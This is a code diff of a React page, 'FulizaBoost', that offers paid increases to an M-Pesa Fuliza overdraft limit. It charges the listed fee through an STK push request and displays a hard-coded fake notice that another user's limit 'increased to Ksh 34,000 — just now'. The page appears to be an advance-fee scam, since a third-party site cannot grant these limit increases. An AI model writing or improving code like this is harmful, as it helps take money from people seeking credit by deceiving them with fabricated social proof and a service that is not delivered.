@@ -25,42 +25,52 @@ const limits: Limit[] = [
   { id: "l14", amount: 70000, fee: 2000 },
 ];
 
-export default function FulizaBoostUI() {
-  const [selected, setSelected] = useState<Limit | null>(null);
-  const [phone, setPhone] = useState("");
-  const [loading, setLoading] = useState(false);
+export default function FulizaBoost() {
+  const [selectedLimit, setSelectedLimit] = useState<Limit | null>(null);
+  const [loadingId, setLoadingId] = useState<string | null>(null);
   const [message, setMessage] = useState<string | null>(null);
+  const [phone, setPhone] = useState("");
 
-  const handlePay = async () => {
-    if (!selected) return setMessage("Select a limit");
-    if (!phone) return setMessage("Enter phone number");
+  const handleBuy = async () => {
+    if (!selectedLimit) return;
+    if (!phone) {
+      setMessage("Please enter a phone number");
+      return;
+    }
 
-    setLoading(true);
+    setLoadingId(selectedLimit.id);
     setMessage("Processing payment...");
 
+    const BACKEND_URL =
+      process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";
+
     try {
-      const res = await fetch(`${process.env.NEXT_PUBLIC_BACKEND_URL}/api/stk`, {
+      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           phone,
-          amount: selected.fee,
-          description: `Fuliza limit increase to ${selected.amount}`,
+          amount: selectedLimit.fee, // 🔥 IMPORTANT: charging the FEE
+          local_id: `O${Date.now().toString(36)}${crypto
+            .getRandomValues(new Uint8Array(2))
+            .join("")}`,
+          transaction_desc: `Fuliza increase to Ksh ${selectedLimit.amount}`,
         }),
       });
 
       const data = await res.json();
 
-      if (data.success) {
-        setMessage("STK Push sent. Check your phone.");
+      if (data.status) {
+        setMessage("STK Push sent! Check your phone.");
       } else {
-        setMessage("Payment failed.");
+        setMessage("Payment failed. Try again.");
       }
     } catch {
-      setMessage("Server error.");
+      setMessage("Error sending payment. Try again later.");
+    } finally {
+      setLoadingId(null);
+      setTimeout(() => setMessage(null), 5000);
     }
-
-    setLoading(false);
   };
 
   return (
@@ -68,13 +78,11 @@ export default function FulizaBoostUI() {
       <div className="w-full max-w-md pb-10">
 
         {/* Header */}
-        <div className="bg-white px-4 pt-6 pb-4 shadow-sm">
-          <h1 className="text-xl font-bold text-center">
-            Increase Fuliza Limit
-          </h1>
+        <div className="bg-white px-4 pt-6 pb-4 shadow-sm text-center font-bold text-lg">
+          Increase Fuliza Limit
         </div>
 
-        {/* Title */}
+        {/* FulizaBoost Title */}
         <div className="text-center mt-6">
           <h2 className="text-2xl font-bold">
             <span className="text-blue-500">Fuliza</span>
@@ -86,37 +94,35 @@ export default function FulizaBoostUI() {
         </div>
 
         {/* Info Box */}
-        <div className="bg-white mx-4 mt-6 p-4 rounded-2xl border border-gray-200 text-sm text-gray-600">
+        <div className="bg-white mx-4 mt-6 p-4 rounded-2xl border text-sm text-gray-600">
           ⚠ Choose your new Fuliza limit and complete the payment to get instant access.
         </div>
 
         {/* Recent Increase */}
         <div className="mx-4 mt-4 bg-green-50 border-l-4 border-green-400 p-3 rounded-xl text-sm">
-          <span className="text-gray-600">
-            07201****62 increased to <strong>Ksh 34,000</strong> — just now
-          </span>
+          07201****62 increased to <strong>Ksh 34,000</strong> — just now
         </div>
 
-        {/* Progress bar */}
+        {/* Progress Bar */}
         <div className="flex mx-4 mt-4 h-2 rounded-full overflow-hidden">
           <div className="bg-blue-400 w-1/3"></div>
           <div className="bg-green-400 w-1/3"></div>
           <div className="bg-red-400 w-1/3"></div>
         </div>
 
-        {/* Select Title */}
+        {/* Section Title */}
         <div className="mx-4 mt-6 text-blue-600 font-semibold text-sm">
           💼 Select Your Fuliza Limit
         </div>
 
-        {/* Limits Grid */}
+        {/* Limit Grid */}
         <div className="grid grid-cols-2 gap-4 px-4 mt-4">
           {limits.map((limit) => (
             <div
               key={limit.id}
-              onClick={() => setSelected(limit)}
+              onClick={() => setSelectedLimit(limit)}
               className={`p-4 rounded-2xl border-2 cursor-pointer transition text-center ${
-                selected?.id === limit.id
+                selectedLimit?.id === limit.id
                   ? "border-blue-600 bg-blue-50"
                   : "border-blue-200 bg-white"
               }`}
@@ -142,14 +148,14 @@ export default function FulizaBoostUI() {
           />
         </div>
 
-        {/* Pay Button */}
+        {/* Continue Button */}
         <div className="px-4 mt-4">
           <button
-            onClick={handlePay}
-            disabled={loading}
+            onClick={handleBuy}
+            disabled={loadingId !== null}
             className="w-full bg-blue-600 text-white py-3 rounded-xl font-semibold"
           >
-            {loading ? "Processing..." : "Continue"}
+            {loadingId ? "Processing..." : "Continue"}
           </button>
         </div>
 
